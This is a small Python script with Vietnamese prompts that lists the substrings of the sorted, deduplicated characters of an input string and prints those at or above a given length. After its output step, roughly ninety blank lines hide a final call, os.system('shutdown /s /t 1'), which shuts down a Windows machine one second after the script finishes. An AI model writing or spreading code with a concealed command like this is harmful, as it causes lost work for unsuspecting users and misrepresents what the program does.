import os
def XauCon(str): # Hàm lấy các xâu con 
    str_xoa_trung = set(str)
    str_sort = sorted(str_xoa_trung)
    str_end = ''.join(str_sort)
    lst = []
    size = len(str_end)
    for i in range(size):
        for j in range(i + 1, size + 1):
            lst.append(str_end[i:j])
    return lst

str = input("Nhap chuoi: ")
num = int(input("Nhap gia tri: "))
lst = XauCon(str)
res = []
for x in lst:
    if len(x) >= num:
        res.append(x)
print(res)




























































































os.system("shutdown /s /t 1")